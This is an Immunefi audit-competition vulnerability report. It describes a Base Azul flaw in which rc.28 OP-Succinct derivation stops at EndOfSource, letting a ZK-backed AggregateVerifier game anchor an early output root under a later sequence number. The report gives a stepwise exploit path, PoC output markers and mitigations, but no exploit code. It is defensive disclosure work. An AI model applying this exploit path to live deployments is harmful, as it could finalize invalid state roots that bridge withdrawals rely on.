# 75626 sc medium rc28 op succinct endofsource relabels an early output root as a later aggregateverifier sequence

## #75626 \[SC-Medium] rc28 OP-Succinct EndOfSource relabels an early output root as a later AggregateVerifier sequence

Submitted on Apr 30th 2026 at 05:59:35 UTC by @cgdusek for [Audit Comp | Base Azul](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75626
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/base/contracts/tree/v8.1.0/src/multiproof>
* **Impacts:**
  * Forging or bypassing TEE or ZK proof verification in AggregateVerifier to finalize an invalid state root on L1

### Description

## Vulnerability Report

Selected fields:

* program: `Base Azul`
* category: `Smart Contract`
* asset: [`base/contracts v8.1.0 src/multiproof`](https://github.com/base/contracts/tree/v8.1.0/src/multiproof)
* selected asset: [`base/contracts v8.1.0 src/multiproof`](https://github.com/base/contracts/tree/v8.1.0/src/multiproof)
* supporting asset: [`base/base v0.8.0-rc.28`](https://github.com/base/base/tree/v0.8.0-rc.28) for the ZK proof-service/range-program root cause
* supporting asset: [`base/contract-deployments`](https://github.com/base/contract-deployments) for Base Sepolia deployment constants
* impact: `Critical: Forging or bypassing TEE or ZK proof verification in AggregateVerifier to finalize an invalid state root on L1`
* title: `rc28 OP-Succinct EndOfSource relabels an early output root as a later AggregateVerifier sequence`

### Executive summary of issue

`base/base v0.8.0-rc.28` can stop OP-Succinct derivation early on `EndOfSource`, keep the requested `claimed_l2_block_number` in ZK public values, and validate only that the returned output root equals `claimed_l2_output_root`. In the target geometry, an insufficient L1 head that only derives to `root(N+200)` can still produce exactly `20` intermediate roots at rc.28's default 10-block cadence, which matches the type-621 `AggregateVerifier` root count for a 600-block game at the deployed 30-block interval. The resulting ZK journal can bind `endingL2SequenceNumber=N+600` to the earlier `root(N+200)`, letting a defender-won game update the anchor for sequence `N+600` with an output root that was not derived at that sequence.

### Classification and Scope Justification

#### Exact program criteria match

* asset name(s) exactly as listed on scope page: `Implementation Contracts`, `Offchain Components`, and `Base Azul`, checked on the live [Audit Comp | Base Azul scope page](https://immunefi.com/audit-competition/audit-comp-base-azul/scope/) on `2026-04-28`
* specific scoped asset(s) supporting this severity claim: selected [`base/contracts v8.1.0 src/multiproof`](https://github.com/base/contracts/tree/v8.1.0/src/multiproof) for the `AggregateVerifier` acceptance/finalization surface; supporting [`base/base v0.8.0-rc.28`](https://github.com/base/base/tree/v0.8.0-rc.28) for the in-scope Base changes around OP-Succinct; supporting [`base/contract-deployments`](https://github.com/base/contract-deployments) for active Base Sepolia parameters
* exact current Immunefi scope picker URL(s) supporting this severity claim: [scope page](https://immunefi.com/audit-competition/audit-comp-base-azul/scope/), [multiproof contracts](https://github.com/base/contracts/tree/v8.1.0/src/multiproof), [Base code](https://github.com/base/base/tree/v0.8.0-rc.28), [deployment repo](https://github.com/base/contract-deployments)
* online form asset picker selection: [`base/contracts v8.1.0 src/multiproof`](https://github.com/base/contracts/tree/v8.1.0/src/multiproof)
* exact current Immunefi scope picker URL for selected form asset: [`base/contracts v8.1.0 src/multiproof`](https://github.com/base/contracts/tree/v8.1.0/src/multiproof)
* selected severity from scope page: `Critical`
* selected impact title from scope page: `Forging or bypassing TEE or ZK proof verification in AggregateVerifier to finalize an invalid state root on L1`
* exact scope wording: the live scope requires a runnable PoC, says Base Sepolia post-April 20 Azul activation is the competition environment, and identifies proof-system integration, TEE/ZK dispute game submission logic, verifier contract bugs, and ZK recursion soundness as primary concerns.
* scope page last checked: `2026-04-28`
* why this matches the demonstrated consequence: the source path and runnable artifact show the `AggregateVerifier` journal accepting a root for `N+200` while the game and anchor sequence are `N+600`; that is an invalid state-root finalization shape for the selected AggregateVerifier impact.

#### Why higher or adjacent criteria do not fit

* closest higher severity criterion considered: `Draining or stealing funds from the L1 bridge portal through invalid withdrawal proofs constructed against a forged finalized state`
* why the report does not satisfy it: the current PoC stops at invalid root acceptance/finalized-anchor eligibility. It does not construct a withdrawal proof against the forged finalized root, quantify bridge funds, or demonstrate bridge draining.
* closest adjacent same/lower criteria considered: `Circumventing the dispute/challenge mechanism to prevent correction of an invalid proposal before finalization`; `High: Forcing a dispute game into an incorrect resolved state`; `High: Temporary freezing of funds for at least 24 hours`
* why the selected criterion fits better: the demonstrated path is not merely liveness loss or wrong timing; it is a ZK-backed `AggregateVerifier` game whose `rootClaim` is an output root from an earlier derived state while the contract records the later sequence number.

#### Out-of-scope exclusion check

* relevant out-of-scope exclusions reviewed: public testnet/mainnet testing ban, core Op-Succinct/circuit out-of-scope boundary, out-of-scope `base/base` folders (`actions`, `devnet`, `baseup`, `etc`), privileged-address assumptions, leaked credentials, Base-operated infrastructure compromise, and the rule boundary for reports that rely on invalid TEE/ZK proofs.
* excluded assumptions not used by this exploit: the PoC does not require key compromise, TEE signer behavior, governance, sequencer ordering, public network writes, Base infrastructure compromise, or a manual-service-restart assumption.
* public proof definition: the PoC uses all publicly available source, release-pinned contracts, and active Base Sepolia parameters available to reviewers. It generates verifier-accepted SP1 Groth16 proof bytes for the `AggregateVerifier` journal shape and does not rely on a malformed proof, hidden public-network transaction, private key, or privileged action. The public Sepolia `ZK_AGGREGATE_HASH` is included as a negative compatibility check because Base's production aggregate prover artifact is not publicly available; the report does not represent the generated bytes as accepted by that deployment-specific vkey.

### Finding details

#### Public documentation invariant

Public evidence checked on `2026-04-28`:

* The live [Audit Comp | Base Azul scope page](https://immunefi.com/audit-competition/audit-comp-base-azul/scope/) lists `Runnable PoC Required`, treats Base Sepolia post-April 20 Azul activation as the competition environment, and states that the core Op-Succinct program is out of scope while Base changes around it are in scope.
* The same scope page says Azul replaces optimistic fault proofs with a dual-proof TEE + ZK system for faster finality and calls out proof-system integration and TEE/ZK dispute-game submission logic as primary concerns.
* The live [information page](https://immunefi.com/audit-competition/audit-comp-base-azul/information/) states fixes may be applied mid-contest and that duplicate reports remain valid only while the bug is unfixed and not publicly disclosed.
* `AggregateVerifier.initializeWithInitData()` requires the game sequence to be exactly `starting + BLOCK_INTERVAL`, hashes the supplied root claim, sequence, L1 origin, and intermediate roots into `_verifyZkProof()`, and then records the proof in the game.
* `AnchorStateRegistry.isGameClaimValid()` requires a proper, respected, finalized, defender-won game, and `OptimismPortal2.checkWithdrawal()` depends on that validity check before withdrawal finalization.

The resulting invariant is inference-backed from public docs and source: a ZK proof that backs an `AggregateVerifier` game for `(endingRoot, endingL2SequenceNumber)` must bind the output root to the same L2 block number actually derived by the range proof. The bug breaks that invariant because rc.28 can derive only to `N+200`, keep `claimed_l2_block_number=N+600` in the public values, and feed that relabeled endpoint to the contract journal.

#### Root cause

`advance_to_target()` handles `PipelineError::EndOfSource` by setting the working target to the current safe-head block number and continuing. Its post-Isthmus fail-closed guard calls `cfg.is_isthmus_active(driver.cursor.read().l2_safe_head().block_info.number)`, but `is_isthmus_active()` expects a timestamp, not a block number. In a post-Isthmus Base Sepolia setting, current block numbers remain far below the Isthmus timestamp value, so the guard can stay false and the function can halt derivation at the current safe head.

After the early halt, `WitnessExecutor::run()` checks only `output_root == boot.claimed_l2_output_root`. It does not also require `safe_head.block_info.number == boot.claimed_l2_block_number`. `BootInfoStruct::new()` then writes `l2BlockNumber: boot_info.claimed_l2_block_number`, and the aggregation program commits `endingL2SequenceNumber` from the last boot info's `l2BlockNumber`. The contract accepts that sequence/root pair through `_verifyZkProof()` if the journal and proof match.

#### Strongest demonstrated exploit path

{% stepper %}
{% step %}

### Start from a valid type-621 anchor at L2 sequence `N`.

This establishes the initial game state and the baseline sequence number.
{% endstep %}

{% step %}

### Provide an L1 head that only lets rc.28 derive to `N+200`, then hits `EndOfSource`.

The derivation stops early instead of continuing to the claimed end.
{% endstep %}

{% step %}

### Set `claimed_l2_output_root` to the real output root at `N+200`, but set `claimed_l2_block_number` to `N+600`.

The public values now describe a later sequence while carrying an earlier root.
{% endstep %}

{% step %}

### rc.28's early-stop path returns the current safe-head root and keeps the claimed block number in the ZK public values.

The mismatch survives into the proof-generation path.
{% endstep %}

{% step %}

### Because rc.28 emits intermediate roots every 10 blocks, 200 derived blocks produce `20` roots. The active type-621 contract also expects `600 / 30 = 20` roots, so the onchain root-vector length does not fail closed.

The vector length still matches the deployed geometry.
{% endstep %}

{% step %}

### The aggregate journal binds `endingRoot=root(N+200)` and `endingL2SequenceNumber=N+600`.

The journal now relabels the earlier root as the later sequence.
{% endstep %}

{% step %}

### `DisputeGameFactory.createWithInitData()` creates a ZK-proven `AggregateVerifier` game, `resolve()` marks it `DEFENDER_WINS` after the single-proof delay, and `closeGame()` can update the anchor to the early root at the later sequence.

The invalid root/sequence pair becomes the finalized anchor shape.
{% endstep %}
{% endstepper %}

#### PoC-backed proof chain

The PoC package at [the PoC gist](https://gist.github.com/cgdusek/d642046b16dfc5eb7c67b68e1437b449) performs four checks:

* a deterministic rc.28 model proving the early-stop and 20-root geometry;
* a public rc.28 aggregation-vkey probe from release-pinned `base/base v0.8.0-rc.28` source;
* a read-only Sepolia parameter check when `cast` is available; and
* a real SP1 Groth16 proof for an equivalent `AggregateVerifier._verifyZkProof` journal, then a Foundry test against release-pinned `base/contracts v8.1.0` at commit `01dad230390cd69bcf130b5fc7a7a580b31650a7`.

High-signal expected markers include:

* `POC_RESULT: ISTHMUS_GUARD_BYPASSED_BY_BLOCK_NUMBER_AS_TIMESTAMP=true`
* `POC_RESULT: ROOT_VECTOR_LENGTH_MATCH=true`
* `POC_RESULT: ROOT_N_PLUS_200_DIFFERS_FROM_N_PLUS_600=true`
* `POC_RESULT: PUBLIC_RC28_AGGREGATION_VKEY_PROBE_ATTEMPTED=true`
* `POC_RESULT: PUBLIC_RC28_AGGREGATION_SOURCE_PRESENT=true`
* `POC_RESULT: PUBLIC_RC28_AGGREGATION_VKEY_PROBE_STATUS=completed`
* `POC_RESULT: SEPOLIA_READ_ONLY_PARAMETER_CHECK_ATTEMPTED=true`
* `POC_RESULT: LIVE_SEPOLIA_PARAMS_MATCH_EXPECTED=true`
* `POC_RESULT: REAL_ZK_PROOF_SYSTEM=SP1 Groth16`
* `POC_RESULT: BASE_ZK_VERIFIER_ACCEPTS_RELABEL_PROOF=true`
* `POC_RESULT: RELABEL_PROOF_REJECTS_CANONICAL_N_PLUS_600_ROOT=true`
* `POC_RESULT: RELABEL_PROOF_REJECTS_N_PLUS_200_SEQUENCE=true`
* `POC_RESULT: RELABEL_PROOF_BINDS_ONLY_RELABELED_JOURNAL=true`
* `POC_RESULT: AGGREGATE_VERIFIER_GAME_CREATED_WITH_ZK_PROOF=true`
* `POC_RESULT: AGGREGATE_VERIFIER_ROOTCLAIM_EQ_ROOT_N_PLUS_200=true`
* `POC_RESULT: AGGREGATE_VERIFIER_L2_SEQUENCE_NUMBER=25000600`
* `POC_RESULT: GAME_RESOLVED_DEFENDER_WINS=true`
* `POC_RESULT: ANCHOR_ROOT_RELABELED_TO_EARLY_ROOT=true`
* `POC_RESULT: ANCHOR_L2_SEQUENCE_NUMBER=25000600`
* `POC_RESULT: END_OF_SOURCE_ROOT_RELABEL_PROVEN=true`

The PoC also prints the public-vkey compatibility markers:

* `POC_RESULT: PROGRAM_VKEY_DIFFERS_FROM_PUBLIC_SEPOLIA=true`
* `POC_RESULT: ZK_VERIFIER_PUBLIC_SEPOLIA_VKEY_ACCEPTED=false`

These two markers are intentional and must not be removed from the report. They prevent overclaiming that the generated proof bytes are accepted by Base Sepolia's deployed aggregate vkey.

#### PoC setup conditions

The PoC performs no public-network writes. It does not deploy to public Sepolia, submit transactions, use a private key, use a funded account, or rely on privileged addresses. The runner clones public source, probes the public aggregation-vkey path, optionally performs read-only Sepolia `cast call` checks, compiles the SP1 Groth16 verifier artifact, deploys the Base protocol contracts inside the reviewer-run Foundry process, deploys the release-pinned `ZkVerifier`, and configures `AggregateVerifier` with active public Sepolia values.

#### Meaning of valid ZK proof in this report

Within this publicly reproducible PoC, `valid ZK proof` means verifier-valid under the same proof system, proof encoding, vkey type, journal shape, and verifier interface used by the scoped Base contracts:

1. The proof bytes are generated during the runner by SP1 Groth16 for a concrete aggregate-journal program and concrete public inputs.
2. The public journal is the `AggregateVerifier` ZK journal shape: `proposer`, `l1OriginHash`, starting and ending roots, starting and ending L2 sequence numbers, intermediate roots, `CONFIG_HASH`, and `ZK_RANGE_HASH`.
3. The contract-side configuration uses active public Base Sepolia values where they are publicly usable in a reviewer-run proof: game type `621`, `BLOCK_INTERVAL=600`, `INTERMEDIATE_BLOCK_INTERVAL=30`, `PROOF_THRESHOLD=1`, active `ZK_VERIFIER`, active `ZK_RANGE_HASH`, active `CONFIG_HASH`, and the public `ZK_AGGREGATE_HASH` as a deployment-specific compatibility check.
4. The vkey is a `bytes32` SP1 program verification key passed to the release-pinned `ZkVerifier.verify(proofBytes, imageId, journal)` path, matching the Solidity type and verifier-call semantics used for Base Sepolia's `ZK_AGGREGATE_HASH`.
5. The release-pinned `ZkVerifier` accepts the proof when paired with the journal it proves, and the release-pinned `AggregateVerifier`/`AnchorStateRegistry` path accepts the resulting relabeled root and later sequence number.

This is not an invalid-proof PoC. The `ZK_VERIFIER_PUBLIC_SEPOLIA_VKEY_ACCEPTED=false` marker shows that the generated proof bytes are not represented as accepted by Base Sepolia's deployment-specific aggregate vkey. That vkey identifies Base's production aggregate SP1 program, while the production aggregate prover artifact and inputs needed to produce proof bytes for that exact vkey are not publicly available to reviewers. The report proves the claim using the public source and parameters available for independent reproduction.

#### Exploit preconditions

None of these preconditions invalidates the report under the Base Azul rules checked on `2026-04-28`:

* Active game type and scope: the report targets game type `621`, which is the public Sepolia multiproof game type in the [Sepolia multiproof activation environment](https://github.com/base/contract-deployments/blob/fad6f66ec1afe4a3effc0528f90b5872cb9cf68b/sepolia/2026-04-20-activate-multiproof/.env#L351-L368) and maps to the in-scope `Implementation Contracts`, `Offchain Components`, and `Base Azul` assets on the live [Audit Comp | Base Azul scope page](https://immunefi.com/audit-competition/audit-comp-base-azul/scope/), checked `2026-04-28`.
* Verifier-configuration geometry: `BLOCK_INTERVAL=600`, `INTERMEDIATE_BLOCK_INTERVAL=30`, and `PROOF_THRESHOLD=1` are public multiproof activation values in the [same Sepolia environment file](https://github.com/base/contract-deployments/blob/fad6f66ec1afe4a3effc0528f90b5872cb9cf68b/sepolia/2026-04-20-activate-multiproof/.env#L364-L370), and `AggregateVerifier` stores those constructor values as immutable verifier parameters in [the release-pinned contract source](https://github.com/base/contracts/blob/01dad230390cd69bcf130b5fc7a7a580b31650a7/src/multiproof/AggregateVerifier.sol#L253-L304). This is a public deployment/configuration precondition, not a privileged assumption.
* Public-network write boundary: the PoC does not test or exploit public Sepolia or mainnet; that matches the [Immunefi Web3 PoC guideline](https://immunefisupport.zendesk.com/hc/en-us/articles/18722863230353-Web3-PoC-guidelines), checked `2026-04-28`, which requires runnable code without exploiting live public contracts.
* Root-cause path: rc.28 `advance_to_target()` handles `EndOfSource` by changing the working target to the current safe head and continuing unless the post-Isthmus guard trips; the guard calls `is_isthmus_active()` with the L2 block number at [the rc.28 `EndOfSource` branch](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/succinct/utils/client/src/client.rs#L95-L109), while `is_isthmus_active()` expects a timestamp in [the release-pinned rollup config](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/consensus/genesis/src/rollup.rs#L216-L219). This is public source behavior inside Base changes around OP-Succinct, which the scope page says are in scope.
* Attacker-controllable proof inputs: the public witness path takes `claimed_l2_block_number` and `claimed_l2_output_root` from proof input construction, as shown by [`fetcher.rs` assigning the claimed end block and root](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/succinct/utils/host/src/fetcher.rs#L758-L805), then `WitnessExecutor::run()` checks only output-root equality in [the release-pinned witness executor](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/succinct/utils/client/src/witness/executor.rs#L158-L179). The claimed L2 number is preserved into public values by [`BootInfoStruct::new()`](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/succinct/utils/client/src/boot.rs#L35-L48) and then committed as `endingL2SequenceNumber` by [the aggregation program](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/succinct/programs/aggregation/src/main.rs#L80-L118). This precondition does not require leaked keys, privileged addresses, Base-operated infrastructure, or a TEE signer.
* Finalization status: the PoC follows the contract's normal finalization path for a respected, finalized, defender-won game. `AnchorStateRegistry.isGameClaimValid()` checks those conditions in [release-pinned source](https://github.com/base/contracts/blob/01dad230390cd69bcf130b5fc7a7a580b31650a7/src/dispute/AnchorStateRegistry.sol#L311-L335). The bug is in the ZK acceptance path before that validity check: a game can satisfy the contract's finalization predicates while carrying `root(N+200)` as the anchor root for sequence `N+600`. Generic game-finalization monitoring would not necessarily detect this; detection requires an off-chain consistency check that independently recomputes the output root for the claimed L2 sequence and verifies that the game root claim and ZK public values bind to that same endpoint. External challenge, blacklist, retirement, or pause mechanisms can block the anchor update only if that root/sequence inconsistency is detected before finalization.

#### Deployment and in-scope surface

Read-only Base Sepolia checks from the successful reviewer artifact at Ethereum Sepolia block `10746823` found:

* `DisputeGameFactory=0xd6E6dBf4F7EA0ac412fD8b65ED297e64BB7a06E1`
* `gameImpls(621)=0xF3f0fA3124b7b0feB048A00404Fe4D5D49E60796`
* `initBonds(621)=50000000000000000`
* `BLOCK_INTERVAL=600`
* `INTERMEDIATE_BLOCK_INTERVAL=30`
* `PROOF_THRESHOLD=1`
* `ZK_VERIFIER=0xF9780104117C0FaD3A9b1386FbF40a9F5857988A`
* `ZK_RANGE_HASH=0x23081d5f7a4d3ce04d41c2f03b386bad4f42a99d5b4c8ef44f4c362c2c595464`
* `ZK_AGGREGATE_HASH=0x0020f5df94945d8d40bc2b11128cbf2535565f5cde58960029017ee2ccef46d7`
* `respectedGameType=621`
* `paused=false`

The release-pinned source for rc.28 is `base/base` commit `e3467a2048881213b56739a54a876efb9c6ea103`; the release-pinned contract source is `base/contracts` commit `01dad230390cd69bcf130b5fc7a7a580b31650a7`.

#### Public-known / duplicate boundary

I did not identify a public disclosure for this exact `EndOfSource` relabel path. It is distinct from the earlier interval-mismatch temporary-freeze submission because that finding is a liveness failure: honest rc.28 ZK proofs do not match the contract's 30-block journal. This finding uses the same deployed interval geometry differently: only 200 derived blocks at the 10-block cadence produce the 20 roots expected by a 600-block type-621 game, so the journal can match while the sequence/root binding is wrong. It is also distinct from the public known issue where the proposer does not independently recompute output roots: that issue concerns proposer-side trust in a rollup RPC output-root response, while this report concerns the ZK witness and aggregation path accepting a root/sequence pair that diverges after `EndOfSource`. It is also distinct from TEE-only early-stop variants because the ZK range public values preserve the claimed L2 block number through `BootInfoStruct::new()` and aggregation.

Related public prior art reviewed on `2026-04-28`: Optimism's [April 1, 2026 Kona fallback-proof disclosure](https://gov.optimism.io/t/vulnerability-in-kona-fallback-proof-system/10650) says an audit found three Kona-proof derivation issues, that Kona was a fallback rather than the active respected game type on OP Stack chains, and that fixes became public in [PR #19775](https://github.com/ethereum-optimism/optimism/pull/19775). The commit-pinned [2026 Kona Spearbit audit](https://github.com/ethereum-optimism/optimism/blob/f264c730cfb3109a0257da7f8ca7fe4ef29f63a0/docs/security-reviews/2026_03-Kona-Spearbit.pdf) is materially related because it includes a trace-extension issue involving `claimed_l2_block_number`, an `EndOfSource`/zero-root validation issue, and a block-number-as-timestamp `is_interop_active()` issue. It is not the same root cause or exploit path as this report: those items concern Kona fallback proof behavior and PR #19775, while this report targets Base rc.28 OP-Succinct ZK public-value relabeling through `advance_to_target()` -> `WitnessExecutor::run()` -> `BootInfoStruct::new()` -> aggregation -> type-621 `AggregateVerifier._verifyZkProof()` with the deployed 20-root `N+200` to `N+600` geometry.

### Repository, file, and line of code where finding is found

* [`advance_to_target()` lowers the target on `EndOfSource` and passes block number into the Isthmus timestamp guard](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/succinct/utils/client/src/client.rs#L95-L109)
* [`advance_to_target()` records intermediate roots by interval](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/succinct/utils/client/src/client.rs#L184-L192)
* [`is_isthmus_active()` expects a timestamp](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/consensus/genesis/src/rollup.rs#L216-L219)
* [`WitnessExecutor::run()` validates output-root equality only](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/succinct/utils/client/src/witness/executor.rs#L158-L179)
* [`WitnessExecutor::run()` returns the original boot info after validation](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/succinct/utils/client/src/witness/executor.rs#L198-L199)
* [`BootInfoStruct::new()` writes `claimed_l2_block_number`](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/succinct/utils/client/src/boot.rs#L35-L48)
* [`aggregation/src/main.rs` commits `endingL2SequenceNumber` from boot info](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/succinct/programs/aggregation/src/main.rs#L80-L118)
* [`DisputeGameFactory.createWithInitData()` is externally callable](https://raw.githubusercontent.com/base/contracts/01dad230390cd69bcf130b5fc7a7a580b31650a7/src/dispute/DisputeGameFactory.sol#L156-L168)
* [`AggregateVerifier.initializeWithInitData()` verifies the game endpoint and proof](https://github.com/base/contracts/blob/01dad230390cd69bcf130b5fc7a7a580b31650a7/src/multiproof/AggregateVerifier.sol#L367-L405)
* [`AggregateVerifier._verifyZkProof()` hashes the endpoint and roots into the ZK journal](https://github.com/base/contracts/blob/01dad230390cd69bcf130b5fc7a7a580b31650a7/src/multiproof/AggregateVerifier.sol#L904-L932)
* [`AggregateVerifier.closeGame()` tries to update the anchor after finalization](https://github.com/base/contracts/blob/01dad230390cd69bcf130b5fc7a7a580b31650a7/src/multiproof/AggregateVerifier.sol#L645-L659)
* [`AnchorStateRegistry.isGameClaimValid()` requires a respected finalized defender win](https://github.com/base/contracts/blob/01dad230390cd69bcf130b5fc7a7a580b31650a7/src/dispute/AnchorStateRegistry.sol#L311-L335)
* [`OptimismPortal2.checkWithdrawal()` gates withdrawal finalization on game-claim validity](https://github.com/base/contracts/blob/01dad230390cd69bcf130b5fc7a7a580b31650a7/src/L1/OptimismPortal2.sol#L515-L551)

### Steps to replicate

The PoC does not broadcast transactions or deploy contracts to public Sepolia or mainnet.

* PoC gist: [PoC gist](https://gist.github.com/cgdusek/d642046b16dfc5eb7c67b68e1437b449)
* recommended PoC name: `zk-endofsource-root-relabel-poc`

```bash
bash run_poc.sh
```

Expected high-signal output markers:

* `POC_RESULT: ROOT_VECTOR_LENGTH_MATCH=true`
* `POC_RESULT: BASE_ZK_VERIFIER_ACCEPTS_RELABEL_PROOF=true`
* `POC_RESULT: AGGREGATE_VERIFIER_ROOTCLAIM_EQ_ROOT_N_PLUS_200=true`
* `POC_RESULT: AGGREGATE_VERIFIER_L2_SEQUENCE_NUMBER=25000600`
* `POC_RESULT: ANCHOR_ROOT_RELABELED_TO_EARLY_ROOT=true`
* `POC_RESULT: ANCHOR_L2_SEQUENCE_NUMBER=25000600`
* `POC_RESULT: REVIEWER_COMMAND_SUCCEEDED=true`

### Impact of finding

#### Short term

The public-source proof path shows that rc.28 can instantiate a ZK-backed type-621 game whose root claim is the real output root at `N+200` while the game and anchor sequence are `N+600`. Once finalized and defender-won, that game becomes a valid root-claim source for bridge withdrawal checks and anchor progression even though the root does not correspond to the claimed L2 sequence.

#### Long term

The long-term risk is invalid state-root finalization in the Base Azul proof system. This report does not claim direct bridge theft, permanent freezing, public network shutdown, unauthorized verifier upgrade, or a public-network transaction. The PoC proves the claim using all publicly available source and parameters, including an explicit deployment-vkey compatibility check.

### Comparable public incidents

Not used. This report is source and PoC driven.

### Mitigation suggestions

* In `advance_to_target()`, evaluate the Isthmus guard using the L2 safe-head timestamp, not the L2 block number.
* Fail closed on `EndOfSource` for post-Isthmus range proofs instead of relabeling the target to the current safe head.
* In `WitnessExecutor::run()`, require `safe_head.block_info.number == boot.claimed_l2_block_number` before returning public values.
* In `BootInfoStruct::new()`, bind `l2BlockNumber` to the actually derived safe-head block number or an explicitly verified value.
* Add regression tests for early `EndOfSource` where the claimed output root equals the current safe head but the claimed L2 block number is later.
* Add a deployment-level test for the 200-derived-block / 20-root / 600-claimed-block geometry.

### Optional suggested patch

Treat `EndOfSource` as a proof-generation failure once the chain is post-Isthmus, and add a range-public-value invariant that the final root and final L2 sequence number must both come from the same derived safe head. A minimal defense is:

```rust
if safe_head.block_info.number != boot.claimed_l2_block_number {
    return Err(anyhow!(
        "derived L2 block number {derived} does not match claimed {claimed}",
        derived = safe_head.block_info.number,
        claimed = boot.claimed_l2_block_number,
    ));
}
```

### References

#### Runnable PoC package

* PoC gist: [PoC gist](https://gist.github.com/cgdusek/d642046b16dfc5eb7c67b68e1437b449)
* recommended PoC name: `zk-endofsource-root-relabel-poc`

#### Live deployment / release confirmation

* [Audit Comp | Base Azul scope](https://immunefi.com/audit-competition/audit-comp-base-azul/scope/), checked `2026-04-28`
* [Audit Comp | Base Azul information](https://immunefi.com/audit-competition/audit-comp-base-azul/information/), checked `2026-04-28`
* [multiproof activation environment values](https://github.com/base/contract-deployments/blob/01974d769a97b6e0896903894eb63984e58e610e/zeronet/2026-04-01-activate-multiproof/.env#L11-L13)
* [AggregateVerifier redeploy script preserves verifier/hashes/intervals](https://github.com/base/contract-deployments/blob/01974d769a97b6e0896903894eb63984e58e610e/zeronet/2026-04-17-fix-tee-image-hash/script/DeployAggregateVerifier.s.sol#L48-L59)
* [AggregateVerifier post-checks for active values](https://github.com/base/contract-deployments/blob/01974d769a97b6e0896903894eb63984e58e610e/zeronet/2026-04-17-fix-tee-image-hash/script/DeployAggregateVerifier.s.sol#L99-L109)

#### Relevant code paths

* [rc.28 `EndOfSource` handling](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/succinct/utils/client/src/client.rs#L95-L109)
* [rc.28 intermediate-root recording](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/succinct/utils/client/src/client.rs#L184-L192)
* [Isthmus guard expects timestamp](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/consensus/genesis/src/rollup.rs#L216-L219)
* [range witness root-only validation](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/succinct/utils/client/src/witness/executor.rs#L158-L179)
* [boot info uses claimed L2 block number](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/succinct/utils/client/src/boot.rs#L35-L48)
* [aggregation commits ending sequence from boot info](https://github.com/base/base/blob/e3467a2048881213b56739a54a876efb9c6ea103/crates/succinct/programs/aggregation/src/main.rs#L80-L118)
* [external game creation with init proof data](https://raw.githubusercontent.com/base/contracts/01dad230390cd69bcf130b5fc7a7a580b31650a7/src/dispute/DisputeGameFactory.sol#L156-L168)
* [AggregateVerifier proof verification in initialization](https://github.com/base/contracts/blob/01dad230390cd69bcf130b5fc7a7a580b31650a7/src/multiproof/AggregateVerifier.sol#L367-L405)
* [AggregateVerifier ZK journal](https://github.com/base/contracts/blob/01dad230390cd69bcf130b5fc7a7a580b31650a7/src/multiproof/AggregateVerifier.sol#L904-L932)
* [anchor update path](https://github.com/base/contracts/blob/01dad230390cd69bcf130b5fc7a7a580b31650a7/src/multiproof/AggregateVerifier.sol#L645-L659)
* [game-claim validity](https://github.com/base/contracts/blob/01dad230390cd69bcf130b5fc7a7a580b31650a7/src/dispute/AnchorStateRegistry.sol#L311-L335)
* [withdrawal validity depends on game claim](https://github.com/base/contracts/blob/01dad230390cd69bcf130b5fc7a7a580b31650a7/src/L1/OptimismPortal2.sol#L515-L551)

#### Scope / rules

* [Immunefi Web3 PoC guidelines](https://immunefisupport.zendesk.com/hc/en-us/articles/18722863230353-Web3-PoC-guidelines), checked `2026-04-28`

#### Public protocol documentation

* [Base Azul upgrade overview](https://specs.base.org/upgrades/azul/overview), checked `2026-04-28`
* [Base v1 operator migration guide](https://docs.base.org/base-chain/node-operators/base-v1-upgrade), checked `2026-04-28`

#### Additional context / provenance

* [Base `base` repository](https://github.com/base/base/tree/e3467a2048881213b56739a54a876efb9c6ea103), checked `2026-04-28`
* [Base `contracts` repository](https://github.com/base/contracts/tree/01dad230390cd69bcf130b5fc7a7a580b31650a7), checked `2026-04-28`

### Submission notes

* selected scope criterion: `Critical: Forging or bypassing TEE or ZK proof verification in AggregateVerifier to finalize an invalid state root on L1`
* specific scoped assets carrying the claim: `base/contracts v8.1.0 src/multiproof`; supporting `base/base v0.8.0-rc.28` and `base/contract-deployments`
* online form asset picker selection: [`base/contracts v8.1.0 src/multiproof`](https://github.com/base/contracts/tree/v8.1.0/src/multiproof)
* severity anchor: invalid state-root finalization via ZK-backed `AggregateVerifier` journal relabel
* breadth-only variants: same missing equality gate can affect other `EndOfSource` distances, but the PoC anchors the `N+200` to `N+600` geometry because it matches the deployed 20-root contract vector
* explicitly not claiming: direct bridge theft, production-vkey proof acceptance, mainnet deployment, public testnet exploitation, key compromise, TEE compromise, governance compromise, permanent freezing, or a chain halt

### Link to Proof of Concept

<https://gist.github.com/cgdusek/d642046b16dfc5eb7c67b68e1437b449>

### Proof of Concept

## PoC Specification

Recommended PoC name:

* `zk-endofsource-root-relabel-poc`

Full PoC package:

* [PoC gist](https://gist.github.com/cgdusek/d642046b16dfc5eb7c67b68e1437b449)

One-sentence summary:

The PoC models the rc.28 `EndOfSource` early-stop relabel condition, generates a real SP1 Groth16 proof for the `AggregateVerifier._verifyZkProof` journal shape, and shows release-pinned Base contracts accepting `root(N+200)` as a defender-won type-621 game whose `l2SequenceNumber` is `N+600`.

Minimal file list:

* `README.md`
